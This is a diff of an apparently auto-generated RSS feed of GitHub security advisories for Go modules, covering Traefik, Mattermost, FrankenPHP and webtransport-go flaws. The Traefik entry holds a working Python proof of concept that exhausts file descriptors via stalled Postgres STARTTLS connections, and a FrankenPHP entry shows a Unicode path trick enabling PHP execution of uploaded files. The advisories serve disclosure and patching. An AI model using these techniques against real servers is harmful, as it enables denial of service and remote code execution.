@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-02-12T15:14:28.279Z</updated>
+    <updated>2026-02-12T16:15:41.518Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,513 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/traefik/traefik/v3] Traefik: TCP readTimeout bypass via STARTTLS on Postgres]]></title>
+        <id>https://github.com/advisories/GHSA-89p3-4642-cr2w</id>
+        <link href="https://github.com/advisories/GHSA-89p3-4642-cr2w"/>
+        <updated>2026-02-12T15:54:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>There is a potential vulnerability in Traefik managing STARTTLS requests. </p>
+<p>An unauthenticated client can bypass Traefik entrypoint <code>respondingTimeouts.readTimeout</code> by sending the 8-byte Postgres SSLRequest (STARTTLS) prelude and then stalling, causing connections to remain open indefinitely, leading to a denial of service. </p>
+<h2 id="patches">Patches</h2>
+<ul>
+<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.8">https://github.com/traefik/traefik/releases/tag/v3.6.8</a></li>
+</ul>
+<h2 id="for-more-information">For more information</h2>
+<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
+<details>
+<summary>Original Description</summary>
+
+<h3 id="summary">Summary</h3>
+<p>A remote, unauthenticated client can bypass Traefik entrypoint <code>respondingTimeouts.readTimeout</code> by sending the 8-byte Postgres SSLRequest (STARTTLS) prelude and then stalling, causing connections to remain open indefinitely and enabling file-descriptor and goroutine exhaustion denial of service.</p>
+<p>This triggers during protocol detection <strong>before routing</strong>, so it is reachable on an entrypoint even when <strong>no Postgres/TCP routers are configured</strong> (the PoC uses only an HTTP router).</p>
+<h3 id="details">Details</h3>
+<p>Traefik applies per-connection deadlines based on <code>entryPoints.&lt;name&gt;.transport.respondingTimeouts.readTimeout</code> to prevent protocol detection and request reads from blocking forever (see <code>pkg/server/server_entrypoint_tcp.go</code>, which sets <code>SetReadDeadline</code> on accepted connections).</p>
+<p>However, in the TCP router protocol detection path (<code>pkg/server/router/tcp/router.go</code>), when Traefik detects the Postgres STARTTLS signature on a new connection, it executes a fast-path that clears deadlines:</p>
+<ul>
+<li>detect Postgres SSLRequest (8-byte signature),</li>
+<li>call <code>conn.SetDeadline(time.Time{})</code> (clears all deadlines),</li>
+<li>then enter the Postgres STARTTLS handler (<code>servePostgres</code>).</li>
+</ul>
+<p>The Postgres handler (<code>pkg/server/router/tcp/postgres.go</code>) then blocks waiting for a TLS ClientHello via the same peeking logic used elsewhere (<code>clientHelloInfo(br)</code>), but with deadlines removed. An attacker can therefore:</p>
+<ol>
+<li>connect to any internet-exposed TCP entrypoint,</li>
+<li>send the Postgres SSLRequest (SSL negotiation request),</li>
+<li>receive Traefik’s single-byte response (<code>S</code>),</li>
+<li>stop sending any further bytes.</li>
+</ol>
+<p>Each such connection remains open past the configured <code>readTimeout</code> (indefinitely), consuming a goroutine and a file descriptor until Traefik hits process limits.</p>
+<p><em>Of note</em>: CVE-2026-22045 fixed a conceptually-similar DoS where a protocol-specific fast path cleared connection deadlines and then could block in TLS handshake processing, allowing unauthenticated clients to tie up goroutines/FDs indefinitely. This report is the same failure mode, but triggered via the Postgres STARTTLS detection path.</p>
+<p>Tested versions:</p>
+<ul>
+<li><code>v3.6.7</code></li>
+<li><code>master</code> at commit <code>a4a91344edcdd6276c1b766ca19ee3f0e346480f</code></li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Prerequisites:</p>
+<ul>
+<li>Linux host</li>
+<li>Python 3</li>
+<li>A prebuilt Traefik <code>v3.6.7</code> binary. The script below expects the path in the script’s <code>TRAEFIK_BIN</code> constant (edit if needed).</li>
+</ul>
+<p>Execute the script below:</p>
+<details>
+<summary>Script (Click to expand)</summary>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from __future__ import annotations
+
+import os
+import socket
+import subprocess
+import tempfile
+import time
+from typing import Final
+
+# Hardcode the Traefik binary path. Edit as needed.
+TRAEFIK_BIN: Final[str] = "/usr/local/sbin/traefik"
+
+HOST: Final[str] = "127.0.0.1"
+PORT: Final[int] = 18080
+
+STARTUP_SLEEP_SECS: Final[float] = 2.0
+READ_TIMEOUT_SECS: Final[float] = 2.0
+SLEEP_SECS: Final[float] = 3.5
+N_CONNS: Final[int] = 300
+
+POSTGRES_SSLREQUEST: Final[bytes] = bytes([0x00, 0x00, 0x00, 0x08, 0x04, 0xD2, 0x16, 0x2F])
+
+
+def fd_count(pid: int) -&gt; int:
+    return len(os.listdir(f"/proc/{pid}/fd"))
+
+
+def open_idle_conns(n: int) -&gt; list[socket.socket]:
+    conns: list[socket.socket] = []
+    for _ in range(n):
+        conns.append(socket.create_connection((HOST, PORT)))
+    return conns
+
+
+def open_postgres_sslrequest_conns(n: int) -&gt; list[socket.socket]:
+    conns: list[socket.socket] = []
+    for _ in range(n):
+        s = socket.create_connection((HOST, PORT))
+        s.settimeout(1.0)
+        s.sendall(POSTGRES_SSLREQUEST)
+        try:
+            _ = s.recv(1)  # typically b"S"
+        except socket.timeout:
+            pass
+        conns.append(s)
+    return conns
+
+
+def close_all(conns: list[socket.socket]) -&gt; None:
+    for s in conns:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+
+def main() -&gt; None:
+    with tempfile.TemporaryDirectory(prefix="vh-traefik-f005-") as td:
+        dyn = os.path.join(td, "dynamic.yml")
+        with open(dyn, "w", encoding="utf-8") as f:
+            f.write(
+                f"""\
+http:
+  routers:
+    r:
+      entryPoints: [web]
+      rule: "PathPrefix(`/`)"
+      service: s
+  services:
+    s:
+      loadBalancer:
+        servers:
+          - url: "http://{HOST}:9"
+"""
+            )
+
+        proc = subprocess.Popen(
+            [
+                TRAEFIK_BIN,
+                "--log.level=ERROR",
+                f"--entryPoints.web.address=:{PORT}",
+                f"--entryPoints.web.transport.respondingTimeouts.readTimeout={READ_TIMEOUT_SECS}s",
+                f"--providers.file.filename={dyn}",
+                "--providers.file.watch=false",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.STDOUT,
+        )
+        try:
+            time.sleep(STARTUP_SLEEP_SECS)
+
+            pid = proc.pid
+            if pid is None:
+                raise RuntimeError("Traefik PID is None")
+
+            ver = subprocess.check_output([TRAEFIK_BIN, "version"], text=True).strip()
+            print(ver)
+            print(f"Traefik={TRAEFIK_BIN}")
+            print(f"Host={HOST} Port={PORT} ReadTimeout={READ_TIMEOUT_SECS}s N={N_CONNS} Sleep={SLEEP_SECS}s")
+
+            base = fd_count(pid)
+            print(f"traefik_pid={pid} fd_base={base}")
+
+            idle = open_idle_conns(N_CONNS)
+            fd_after_open_idle = fd_count(pid)
+            print(f"baseline_opened={N_CONNS} fd_after_open={fd_after_open_idle} delta={fd_after_open_idle - base}")
+            time.sleep(SLEEP_SECS)
+            fd_after_sleep_idle = fd_count(pid)
+            print(f"baseline_after_sleep fd={fd_after_sleep_idle} delta_from_base={fd_after_sleep_idle - base}")
+            close_all(idle)
+
+            pg = open_postgres_sslrequest_conns(N_CONNS)
+            fd_after_open_pg = fd_count(pid)
+            print(f"candidate_opened={N_CONNS} fd_after_open={fd_after_open_pg} delta={fd_after_open_pg - base}")
+            time.sleep(SLEEP_SECS)
+            fd_after_sleep_pg = fd_count(pid)
+            print(f"candidate_after_sleep fd={fd_after_sleep_pg} delta_from_base={fd_after_sleep_pg - base}")
+            close_all(pg)
+
+            if (fd_after_sleep_idle - base) &lt;= 5 and (fd_after_sleep_pg - base) &gt;= (N_CONNS // 2):
+                print("VULNERABLE: Postgres SSLRequest keeps connections open past entrypoint readTimeout.")
+            else:
+                print("INCONCLUSIVE: adjust N_CONNS upward or inspect Traefik logs.")
+        finally:
+            proc.terminate()
+            try:
+                proc.wait(timeout=3.0)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait(timeout=3.0)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+</details>
+
+
+<details>
+<summary>Expected output (Click to expand)</summary>
+
+<pre><code class="language-bash">Version:      3.6.7
+Codename:     ramequin
+Go version:   go1.24.11
+Built:        2026-01-14T14:04:03Z
+OS/Arch:      linux/amd64
+Traefik=/usr/local/sbin/traefik
+Host=127.0.0.1 Port=18080 ReadTimeout=2.0s N=300 Sleep=3.5s
+traefik_pid=46204 fd_base=6
+baseline_opened=300 fd_after_open=128 delta=122
+baseline_after_sleep fd=6 delta_from_base=0
+candidate_opened=300 fd_after_open=306 delta=300
+candidate_after_sleep fd=306 delta_from_base=300
+VULNERABLE: Postgres SSLRequest keeps connections open past entrypoint readTimeout.
+</code></pre>
+</details>
+
+<h3 id="impact-1">Impact</h3>
+<p>Denial of service. Any internet-exposed entrypoint using the TCP switcher/protocol detection (including "web" HTTP entrypoints) with a <code>readTimeout</code> is affected; no Postgres configuration is required. At sufficient concurrency, Traefik can hit process limits (FD exhaustion/goroutine pressure/memory), taking the proxy offline.</p>
+</details>
+### References
+
+<ul>
+<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-89p3-4642-cr2w">https://github.com/traefik/traefik/security/advisories/GHSA-89p3-4642-cr2w</a></li>
+<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.8">https://github.com/traefik/traefik/releases/tag/v3.6.8</a></li>
+<li><a href="https://github.com/advisories/GHSA-89p3-4642-cr2w">https://github.com/advisories/GHSA-89p3-4642-cr2w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-89p3-4642-cr2w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-12T15:54:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Server allows an attacker to specify a full pathname of a log file]]></title>
+        <id>https://github.com/advisories/GHSA-m2ch-x2q7-2284</id>
+        <link href="https://github.com/advisories/GHSA-m2ch-x2q7-2284"/>
+        <updated>2026-02-12T15:43:45.000Z</updated>
+        <content type="html"><![CDATA[<p>An issue was discovered in Mattermost Server before 3.7.5. It allows an attacker to specify a full pathname of a log file.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-18912">https://nvd.nist.gov/vuln/detail/CVE-2017-18912</a></li>
+<li><a href="https://github.com/mattermost/mattermost/commit/0b5c0794fdcbb551c1233dcdfbdf5c7deb585fd6">https://github.com/mattermost/mattermost/commit/0b5c0794fdcbb551c1233dcdfbdf5c7deb585fd6</a></li>
+<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
+<li><a href="https://github.com/advisories/GHSA-m2ch-x2q7-2284">https://github.com/advisories/GHSA-m2ch-x2q7-2284</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m2ch-x2q7-2284</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-05-24T17:21:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dunglas/frankenphp] FrankenPHP's unicode case-folding length expansion causes incorrect split_path index (SCRIPT_NAME/PATH_INFO confusion) in FrankenPHP]]></title>
+        <id>https://github.com/advisories/GHSA-g966-83w7-6w38</id>
+        <link href="https://github.com/advisories/GHSA-g966-83w7-6w38"/>
+        <updated>2026-02-12T15:29:37.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>FrankenPHP’s CGI path splitting logic improperly handles Unicode characters during case conversion. The logic computes the split index (for finding <code>.php</code>) on a lowercased copy of the request path but applies that byte index to the original path.</p>
+<p>Because <code>strings.ToLower()</code> in Go can increase the byte length of certain UTF-8 characters (e.g., <code>Ⱥ</code> expands when lowercased), the computed index may not align with the correct position in the original string. This results in an incorrect <code>SCRIPT_NAME</code> and <code>SCRIPT_FILENAME</code>, potentially causing FrankenPHP to execute a file other than the one intended by the URI.</p>
+<h3 id="details"><strong>Details</strong></h3>
+<p>The vulnerability resides in the <code>splitPos()</code> function and its usage within <code>splitCgiPath()</code>. The logic attempts to find the script extension (e.g., <code>.php</code>) in a case-insensitive manner by lowercasing the path:</p>
+<pre><code class="language-go">lowerPath := strings.ToLower(path)
+idx := strings.Index(lowerPath, strings.ToLower(split))
+return idx + len(split)
+</code></pre>
+<p>The issue is that the returned <code>idx</code> represents a byte offset within <code>lowerPath</code>. However, <code>splitCgiPath()</code> uses this index to slice the <strong>original</strong> <code>path</code>:</p>
+<pre><code class="language-go">fc.docURI = path[:splitPos]
+fc.pathInfo = path[splitPos:]
+fc.scriptName = strings.TrimSuffix(path, fc.pathInfo)
+fc.scriptFilename = sanitizedPathJoin(fc.documentRoot, fc.scriptName)
+</code></pre>
+<p>This logic relies on the assumption that <code>len(strings.ToLower(path)) == len(path)</code>. This assumption is false for certain Unicode characters. For example, the character <code>Ⱥ</code> (U+023A) requires 2 bytes in UTF-8 (<code>0xC8 0xBA</code>), but its lowercase equivalent <code>ⱥ</code> (U+2C65) requires 3 bytes (<code>0xE2 0xB1 0xA5</code>).</p>
+<p>If the path contains such characters before the <code>.php</code> extension, the index calculated on <code>lowerPath</code> will be larger than the corresponding visual point in the original <code>path</code>. When applied to the original path, the split occurs at the wrong byte offset. This can cause the server to treat a larger portion of the path as the script name, effectively allowing an attacker to manipulate <code>SCRIPT_FILENAME</code>.</p>
+<h3 id="poc"><strong>PoC</strong></h3>
+<p>The following Go program demonstrates the discrepancy between the byte index in the lowercased string versus the original string.</p>
+<ol>
+<li>Save the following as <code>poc.go</code>:</li>
+</ol>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "strings"
+)
+
+func splitPos(path string, split string) int {
+    lowerPath := strings.ToLower(path)
+    idx := strings.Index(lowerPath, strings.ToLower(split))
+    if idx &lt; 0 {
+        return -1
+    }
+    return idx + len(split)
+}
+
+func main() {
+    // U+023A: Ⱥ (UTF-8: C8 BA). Lowercase is ⱥ (UTF-8: E2 B1 A5), longer in bytes.
+    // We construct a path where the byte expansion shifts the index.
+    path := "/ȺȺȺȺshell.php.txt.php"
+    split := ".php"
+
+    pos := splitPos(path, split)
+
+    fmt.Printf("orig bytes=%d\n", len(path))
+    fmt.Printf("lower bytes=%d\n", len(strings.ToLower(path)))
+    fmt.Printf("splitPos=%d\n", pos)
+
+    // Current Unsafe Behavior:
+    fmt.Printf("orig[:pos] (Calculated Script)=%q\n", path[:pos])
+    fmt.Printf("orig[pos:] (Calculated PathInfo)=%q\n", path[pos:])
+
+    // Expected Safe Behavior:
+    want := strings.Index(path, split) + len(split)
+    fmt.Printf("expected splitPos=%d\n", want)
+    fmt.Printf("expected orig[:]=%q\n", path[:want])
+}
+</code></pre>
+<ol start="2">
+<li>Run the PoC:</li>
+</ol>
+<pre><code class="language-console">go run poc.go
+</code></pre>
+<ol start="3">
+<li><strong>Output:</strong></li>
+</ol>
+<pre><code class="language-text">orig bytes=26
+lower bytes=30
+splitPos=22
+orig[:pos]="/ȺȺȺȺshell.php.txt"
+orig[pos:]=".php"
+expected splitPos=18
+expected orig[:]="/ȺȺȺȺshell.php"
+</code></pre>
+<p>In this example, FrankenPHP would identify <code>/ȺȺȺȺshell.php.txt</code> as the PHP script to execute, ignoring the fact that the actual file extension in the file system might be <code>.txt</code>.</p>
+<h3 id="impact">Impact*</h3>
+<p>This is a <strong>Security Boundary Bypass</strong> and <strong>Path Confusion</strong> vulnerability.</p>
+<p>In setups where users can upload files (e.g., avatars, text files) that are stored within the document root or a reachable path, an attacker can upload a file containing malicious PHP code with a safe extension (e.g., <code>payload.txt</code>). By crafting a request with specific Unicode characters, the attacker can force FrankenPHP to calculate the <code>SCRIPT_FILENAME</code> as ending in <code>payload.txt</code>, while the request appears to contain <code>.php</code> to the internal router logic.</p>
+<p>This results in the execution of non-PHP files as PHP scripts, leading to <strong>Remote Code Execution (RCE)</strong>.</p>
+<h3 id="patched-versions"><strong>Patched Versions</strong></h3>
+<ul>
+<li>This issue is fixed in FrankenPHP version <strong>1.11.2</strong>.</li>
+</ul>
+<h3 id="workarounds"><strong>Workarounds</strong></h3>
+<ul>
+<li>Ensure that user-uploaded files are stored outside of the public document root.</li>
+<li>Implement strict WAF rules to reject requests containing specific multi-byte Unicode characters in the URL path if an upgrade is not immediately possible.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38">https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38</a></li>
+<li><a href="https://github.com/php/frankenphp/commit/04fdc0c1e8fde94e2c1ad86217e962c88d27c53e">https://github.com/php/frankenphp/commit/04fdc0c1e8fde94e2c1ad86217e962c88d27c53e</a></li>
+<li><a href="https://github.com/php/frankenphp/releases/tag/v1.11.2">https://github.com/php/frankenphp/releases/tag/v1.11.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-g966-83w7-6w38">https://github.com/advisories/GHSA-g966-83w7-6w38</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g966-83w7-6w38</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-12T15:29:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dunglas/frankenphp] FrankenPHP leaks session data between requests in worker mode]]></title>
+        <id>https://github.com/advisories/GHSA-r3xh-3r3w-47gp</id>
+        <link href="https://github.com/advisories/GHSA-r3xh-3r3w-47gp"/>
+        <updated>2026-02-12T15:29:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When running FrankenPHP in <strong>worker mode</strong>, the <code>$_SESSION</code> superglobal is not correctly reset between requests. This allows a subsequent request processed by the same worker to access the <code>$_SESSION</code> data of the previous request (potentially belonging to a different user) before <code>session_start()</code> is called.</p>
+<h3 id="details">Details</h3>
+<p>In standard PHP execution, the environment is torn down completely after every request. In FrankenPHP's worker mode, the application stays in memory, and superglobals are manually reset between requests.</p>
+<p>The vulnerability exists because <code>$_SESSION</code> is stored in the Zend Engine's symbol table (<code>EG(symbol_table)</code>). While the standard PHP request shutdown (RSHUTDOWN) decrements the reference count of the session data, it does not remove the <code>$_SESSION</code> variable itself from the symbol table. FrankenPHP's reset logic (<code>frankenphp_reset_super_globals</code>) previously cleared other superglobals but failed to explicitly delete <code>$_SESSION</code>.</p>
+<p>Consequently, until <code>session_start()</code> is called in the new request (which re-initializes the variable), the <code>$_SESSION</code> array retains the data from the previous request processed by that specific worker thread.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>cross-request data leakage</strong> vulnerability.</p>
+<ul>
+<li><strong>Confidentiality:</strong> If an application reads <code>$_SESSION</code> before calling <code>session_start()</code>, it can access sensitive information (authentication tokens, user IDs, PII) belonging to the previous user.</li>
+<li><strong>Logic Errors / Impersonation:</strong> If application logic relies on <code>$_SESSION</code> being empty or unset to detect a "guest" state, or checks for specific keys in <code>$_SESSION</code> prior to session initialization, a malicious actor (or accidental race condition) could trigger privilege escalation or user impersonation.</li>
+</ul>
+<p>This affects only users running FrankenPHP in <strong>worker mode</strong> and not <code>session_start()</code> for each request, which is done by default by most frameworks.</p>
+<h3 id="poc">PoC</h3>
+<p>The following steps demonstrate the issue (derived from the regression tests added in the fix):</p>
+<ol>
+<li><strong>Client A</strong> sends a request that starts a session and sets sensitive data:</li>
+</ol>
+<pre><code class="language-php">// Request 1
+session_start();
+$_SESSION['secret'] = 'AliceData';
+session_write_close();
+</code></pre>
+<ol start="2">
+<li><strong>Client B</strong> (or the same client without cookies) sends a request to the same worker. This script checks <code>$_SESSION</code> <em>without</em> starting a session:</li>
+</ol>
+<pre><code class="language-php">// Request 2
+// session_start() is NOT called
+if (!empty($_SESSION)) {
+    echo "Leaked Data: " . $_SESSION['secret'];
+}
+</code></pre>
+<ol start="3">
+<li><strong>Result:</strong> Client B receives "Leaked Data: AliceData".</li>
+</ol>
+<h3 id="workarounds">Workarounds</h3>
+<ul>
+<li>Ensure <code>session_start()</code> is called immediately at the entry point of your worker script to overwrite any residual data (though this may not cover all edge cases if middleware runs before the controller).</li>
+<li>Manually unset <code>$_SESSION</code> at the very beginning of the worker loop, before handling the request.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/php/frankenphp/security/advisories/GHSA-r3xh-3r3w-47gp">https://github.com/php/frankenphp/security/advisories/GHSA-r3xh-3r3w-47gp</a></li>
+<li><a href="https://github.com/php/frankenphp/commit/24d6c991a7761b638190eb081deae258143e9735">https://github.com/php/frankenphp/commit/24d6c991a7761b638190eb081deae258143e9735</a></li>
+<li><a href="https://github.com/php/frankenphp/releases/tag/v1.11.2">https://github.com/php/frankenphp/releases/tag/v1.11.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-r3xh-3r3w-47gp">https://github.com/advisories/GHSA-r3xh-3r3w-47gp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-r3xh-3r3w-47gp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-12T15:29:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/quic-go/webtransport-go] webtransport-go: Memory Exhaustion Attack due to Missing Cleanup of Streams Map]]></title>
+        <id>https://github.com/advisories/GHSA-2f2x-8mwp-p2gc</id>
+        <link href="https://github.com/advisories/GHSA-2f2x-8mwp-p2gc"/>
+        <updated>2026-02-12T15:29:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An attacker can cause unbounded memory consumption repeatedly creating and closing many WebTransport streams. Closed streams were not removed from an internal session map, preventing garbage collection of their resources.</p>
+<h2 id="details">Details</h2>
+<p>webtransport-go maintains an internal map tracking WebTransport streams (both unidirectional and bidirectional) belonging to a session. In affected versions, entries for closed streams were not removed from this map, causing the map to grow indefinitely as streams were created and closed.</p>
+<p>A malicious peer can exploit this by opening large numbers of streams and closing them, leading to steady memory growth proportional to the number of closed streams.</p>
+<h2 id="the-fix">The Fix</h2>
+<p>webtransport-go now removes closed streams from the internal map upon closure. This allows the associated resources to be garbage collected, bounding memory usage to active streams only.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/quic-go/webtransport-go/security/advisories/GHSA-2f2x-8mwp-p2gc">https://github.com/quic-go/webtransport-go/security/advisories/GHSA-2f2x-8mwp-p2gc</a></li>
+<li><a href="https://github.com/quic-go/webtransport-go/releases/tag/v0.10.0">https://github.com/quic-go/webtransport-go/releases/tag/v0.10.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-2f2x-8mwp-p2gc">https://github.com/advisories/GHSA-2f2x-8mwp-p2gc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2f2x-8mwp-p2gc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-12T15:29:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/quic-go/webtransport-go] webtransport-go: CloseWithError can block indefinitely]]></title>
+        <id>https://github.com/advisories/GHSA-px4r-g4p3-hhqv</id>
+        <link href="https://github.com/advisories/GHSA-px4r-g4p3-hhqv"/>
+        <updated>2026-02-12T15:29:02.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An attacker can cause a denial of service in webtransport-go by preventing or indefinitely delaying WebTransport session closure. A malicious peer can withhold QUIC flow control credit on the CONNECT stream, blocking transmission of the WT_CLOSE_SESSION capsule and causing the close operation to hang.</p>
+<h2 id="details">Details</h2>
+<p>WebTransport over HTTP/3 signals session termination by sending a WT_CLOSE_SESSION capsule on the CONNECT stream. The capsule is only needed to transmit a reason phrase and an error code to the peer. After the capsule is sent, the CONNECT stream is closed.
+In affected versions, the closure procedure blocked indefinitely while waiting for sufficient QUIC flow control credit from the peer. A malicious peer can withhold this credit, preventing the capsule from being sent.</p>
+<h2 id="the-fix">The Fix</h2>
+<p>webtransport-go now attempts to send the WT_CLOSE_SESSION capsule with a short deadline. If the capsule cannot be sent within this deadline, the CONNECT stream is reset instead. This closes the WebTransport session promptly without transmitting the optional error details.
+This prevents indefinite blocking on session closure.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/quic-go/webtransport-go/security/advisories/GHSA-px4r-g4p3-hhqv">https://github.com/quic-go/webtransport-go/security/advisories/GHSA-px4r-g4p3-hhqv</a></li>
+<li><a href="https://github.com/quic-go/webtransport-go/releases/tag/v0.10.0">https://github.com/quic-go/webtransport-go/releases/tag/v0.10.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-px4r-g4p3-hhqv">https://github.com/advisories/GHSA-px4r-g4p3-hhqv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-px4r-g4p3-hhqv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-12T15:29:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/quic-go/webtransport-go] webtransport-go: Memory Exhaustion Attack due to Missing Length Check in WT_CLOSE_SESSION Capsule]]></title>
+        <id>https://github.com/advisories/GHSA-g6x7-jq8p-6q9q</id>
+        <link href="https://github.com/advisories/GHSA-g6x7-jq8p-6q9q"/>
+        <updated>2026-02-12T15:28:54.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An attacker can cause excessive memory consumption in webtransport-go's session implementation by sending a WT_CLOSE_SESSION capsule containing an excessively large Application Error Message. The implementation does not enforce the draft-mandated limit of 1024 bytes on this field, allowing a peer to send an arbitrarily large message payload that is fully read and stored in memory.</p>
+<p>This allows an attacker to consume an arbitrary amount of memory. The attacker must transmit the full payload to achieve the memory consumption, but the lack of any upper bound makes large-scale attacks feasible given sufficient bandwidth.</p>
+<h2 id="details">Details</h2>
+<p>WebTransport over HTTP/3, as defined in draft-ietf-webtrans-http3, uses the WT_CLOSE_SESSION capsule to signal session termination with an optional detailed error. The draft specifies that the length of the Application Error Message in this capsule MUST NOT exceed 1024 bytes.
+In affected versions of webtransport-go, the parser does not enforce this 1024-byte maximum when processing incoming WT_CLOSE_SESSION capsules. A peer can send a capsule with an excessively large payload, forcing the recipient to allocate and buffer the full amount of transmitted data without bound.</p>
+<h2 id="the-fix">The Fix</h2>
+<p>webtransport-go now limits the length of the parsed Application Error Message to 1024 bytes in WT_CLOSE_SESSION capsules by reading no more than this amount. This prevents excessive memory consumption.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/quic-go/webtransport-go/security/advisories/GHSA-g6x7-jq8p-6q9q">https://github.com/quic-go/webtransport-go/security/advisories/GHSA-g6x7-jq8p-6q9q</a></li>
+<li><a href="https://github.com/quic-go/webtransport-go/releases/tag/v0.10.0">https://github.com/quic-go/webtransport-go/releases/tag/v0.10.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6x7-jq8p-6q9q">https://github.com/advisories/GHSA-g6x7-jq8p-6q9q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6x7-jq8p-6q9q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-12T15:28:52.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/milvus-io/milvus] Milvus: Unauthenticated Access to Restful API on Metrics Port (9091) Leads to Critical System Compromise]]></title>
         <id>https://github.com/advisories/GHSA-7ppg-37fh-vcr6</id>
@@ -610,432 +1117,5 @@ Pull request: #796</p>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-02-10T00:25:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser has an Authentication Bypass in User Password Update]]></title>
-        <id>https://github.com/advisories/GHSA-hxw8-4h9j-hq2r</id>
-        <link href="https://github.com/advisories/GHSA-hxw8-4h9j-hq2r"/>
-        <updated>2026-02-10T02:56:30.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory-authentication-bypass-in-user-password-update">Security Advisory: Authentication Bypass in User Password Update</h1>
-<h2 id="summary">Summary</h2>
-<p>A case-sensitivity flaw in the password validation logic allows any authenticated user to change their password (or an admin to change any user's password) <strong>without providing the current password</strong>. By using Title Case field name <code>"Password"</code> instead of lowercase <code>"password"</code> in the API request, the <code>current_password</code> verification is completely bypassed. This enables account takeover if an attacker obtains a valid JWT token through XSS, session hijacking, or other means.</p>
-<p><strong>CVSS Score</strong>: 7.5 (High)<br><strong>CWE</strong>: CWE-178 (Improper Handling of Case Sensitivity)</p>
-<hr>
-<h2 id="details">Details</h2>
-<p>The vulnerability exists in <code>http/users.go</code> in the <code>userPutHandler</code> function (lines 181-200).</p>
-<h3 id="vulnerable-code">Vulnerable Code</h3>
-<pre><code class="language-go">// http/users.go:181-200
-if d.settings.AuthMethod == auth.MethodJSONAuth {
